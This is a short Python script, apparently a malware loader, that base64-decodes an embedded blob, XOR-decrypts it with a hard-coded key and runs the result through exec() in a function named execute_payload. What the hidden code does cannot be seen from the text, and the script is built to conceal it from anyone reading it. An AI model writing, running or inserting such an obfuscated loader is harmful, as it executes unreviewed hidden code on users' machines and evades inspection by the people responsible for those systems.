
import base64
import os

def xor_decrypt(data: bytes, key: bytes) -> bytes:
    result = bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
    return result

def execute_payload():
    key = [38, 162, 226, 102, 28, 152, 14, 50, 175, 126, 227, 195, 236, 52, 78, 250, 46, 13, 11, 6, 220, 94, 160, 55, 254, 149, 208, 71, 233, 91, 199, 175, 29, 108, 143, 195, 138, 107, 139, 90, 42, 136, 64, 7, 148, 169, 167, 184, 223, 254, 142, 19, 38, 28, 57, 18, 228, 90, 9, 60, 16, 243, 250, 227]  # Embedded XOR key
    key = bytes(key)
    encoded_payload = "LMuPFnPqehLADemqgUQhiFotf2+xO6o93bWAJpA3qM55TOq77wj+LkPnLif4xsDRvPTqdkA8XGqBOXxIdayKgl/OjQd4sCcIpV7D48wXbr9WbGZ2sDuaF6nnuTOMe6aPaQn3t6oN4jZPqCF0tNnV17CYrnxAPFxqgTl8SHmclOkGgsJGa/F6Wo8Rk6aCHCGJAH1qcrRwyliX+/gomnW3zmkEoabyG+o0Tv0zYuaBgMb416IzAWxYa4g1aFhPloKGRdeWA3i2ekrbWcrvzBM53QctanX8OJo93rXwZ8l75497Qvix4x/ucg3YIX74xsbc/5v2dkVpTXeAemhIKtPdww2Clg9x/SBR2xeOpsQdZ/AOLSsmrCzJWYq98heIIqvAfAivpvIO6C9e7SQn59zE27qN/XVTcFVrxXggNhqanMN5/YwHcf1RbY9D3uPOaxGXT2RlWYN8mj3etfBnjCOizGgY6pz6CvI2RekkL72j"
    encrypted_payload = base64.b64decode(encoded_payload.encode())
    decrypted_code = xor_decrypt(encrypted_payload, key)
    exec(decrypted_code.decode())

if __name__ == "__main__":
    execute_payload()
